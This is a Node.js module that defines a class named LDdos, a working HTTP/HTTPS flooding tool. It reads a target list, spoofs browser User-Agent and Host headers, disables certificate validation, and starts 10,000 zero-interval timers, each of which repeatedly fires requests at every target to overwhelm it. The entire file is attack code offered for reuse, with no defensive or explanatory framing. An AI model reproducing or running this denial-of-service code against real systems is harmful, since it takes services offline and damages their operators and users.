
let targets = require('./targets');
let http = require('http');
let https = require('https');

class LDdos {
	
	constructor(opts){
		this.opts = opts;
		this.timers = [];
		this.INTERVAL = 0;
		this.TIMER_NUM = 10000;
		this.events = [
			'response',
			'error',
			'connect',
			'continue',
			'information',
			'abort',
			'timeout',
		]
	}
	
	ddos(){
		
		targets.map(it => {
			
			// let conf = {
			// 	protocol:it.protocol || 'http:',
			// 	host:it.ip,
			// 	port:it.port,
			// 	method:'GET',
			// 	path:this.opts.path,
			// 	headers:{
			// 		'Accept':'*/*',
			// 		'Content-Type':'application/json',
			// 		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'
			// 	},
			// }
			
			let conf = {
				hostname:it.host,
				port:it.port,
				rejectUnauthorized:false,
				method:'GET',
				header:{
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'zh-CN,zh;q=0.9',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Host': 'www.baidu.com',
					'Upgrade-Insecure-Requests': 1,
					'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
				}
			}
			
			let req = it.protocol.indexOf('https') !== -1 ? https.request(conf) : http.request(conf);
			
			this.events.map(t => {
				
				req.on(t , r  => {
					
					if(r.setEncoding){
						r.setEncoding('utf8');
					}
					
					let msg = '';
					msg = t === 'error' ? r.message : '';
					if(msg) console.log(`--------${t}--------`,msg);
					
					if(r.on){
						r.on('data', (body) => {
							console.log(`--------${t}--------`,'success');
						});
					}
					
				})
				
			})
			
			req.end();
			
		})
	}
	
	start(){
		
		this.stop();
		
		for(let i = 0;i < this.TIMER_NUM; i++){
			this.timers.push(
				setInterval(() => {
					this.ddos();
				},this.INTERVAL)
			)
		}
		
	}
	
	stop(){
		
		this.timers.map(t => {
			clearInterval(t);
		})
		
	}
	
}

module.exports = LDdos;